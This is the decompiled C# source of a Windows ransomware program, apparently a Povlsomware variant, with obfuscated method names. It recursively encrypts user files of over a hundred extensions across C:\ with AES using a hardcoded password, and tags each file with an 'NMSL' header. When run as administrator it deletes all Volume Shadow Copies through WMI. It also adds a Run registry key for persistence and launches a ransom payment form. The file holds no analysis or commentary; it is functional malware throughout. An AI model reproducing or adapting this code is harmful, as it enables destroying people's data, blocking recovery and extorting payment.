using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Povlsomware;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal bool method_0(string string_1)
		{
			return string_0.EndsWith(string_1, StringComparison.OrdinalIgnoreCase);
		}
	}

	public static int int_0 = 0;

	public static List<string> list_0 = new List<string>();

	private static readonly string string_0 = "fatego";

	private static readonly string[] string_1 = new string[103]
	{
		"7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
		"sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
		"wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd",
		"vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
		"kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay",
		"bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif",
		"iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw",
		"orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf",
		"srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp",
		"asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf",
		"vob", "wmv", "cfg"
	};

	[STAThread]
	public static string smethod_0()
	{
		return string_0;
	}

	private static void Main()
	{
		smethod_6();
		smethod_4();
		smethod_1();
		smethod_2();
	}

	private static void smethod_1()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("servers") == null && !Application.get_ExecutablePath().Contains("rundll32.exe"))
		{
			registryKey.SetValue("servers", "\"" + Application.get_ExecutablePath() + "\"");
		}
	}

	private static void smethod_2()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		PayM3 payM = new PayM3();
		Application.Run((Form)(object)payM);
	}

	public static void smethod_3(string string_2, string string_3)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_3);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] byte_ = File.ReadAllBytes(string_2).Skip(4).ToArray();
		byte[] array = smethod_12(byte_, bytes);
		FileStream fileStream = File.Open(string_2, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(string_2, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine("Decrypted: " + string_2);
	}

	public static void smethod_4()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
			flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		string text = "\\\\.\\ROOT\\cimv2";
		string text2 = "Win32_ShadowCopy";
		ManagementClass val = new ManagementClass(text + ":" + text2);
		ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				val2.Delete();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void smethod_5(string string_2)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_0);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] byte_ = File.ReadAllBytes(string_2);
		byte[] array = smethod_11(byte_, bytes);
		FileStream fileStream = File.Open(string_2, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(string_2, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("NMSL");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + string_2);
			int_0++;
			list_0.Add(string_2);
		}
	}

	public static void smethod_6()
	{
		string string_ = "C:\\";
		smethod_8(string_, 1, "");
	}

	public static void smethod_7(string string_2)
	{
		string string_3 = "C:\\";
		smethod_8(string_3, 0, string_2);
	}

	public static void smethod_8(string string_2, int int_1, string string_3)
	{
		IEnumerable<string> enumerable = from string_0 in Directory.EnumerateFiles(string_2, "*.*")
			where string_1.Any((string string_1) => string_0.EndsWith(string_1, StringComparison.OrdinalIgnoreCase))
			select string_0;
		foreach (string item in enumerable)
		{
			smethod_10(item, int_1, string_3);
		}
		string[] directories = Directory.GetDirectories(string_2);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows"))
				{
					smethod_8(text, int_1, string_3);
				}
			}
			catch
			{
			}
		}
	}

	public static bool smethod_9(string string_2)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("NMSL");
		byte[] second = File.ReadAllBytes(string_2).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			int_0++;
			list_0.Add(string_2);
			return true;
		}
		return false;
	}

	public static void smethod_10(string string_2, int int_1, string string_3)
	{
		if (int_1 == 1 && !smethod_9(string_2))
		{
			try
			{
				smethod_5(string_2);
				return;
			}
			catch
			{
				return;
			}
		}
		if (int_1 == 0 && smethod_9(string_2))
		{
			try
			{
				smethod_3(string_2, string_3);
			}
			catch
			{
			}
		}
	}

	public static byte[] smethod_11(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] smethod_12(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}
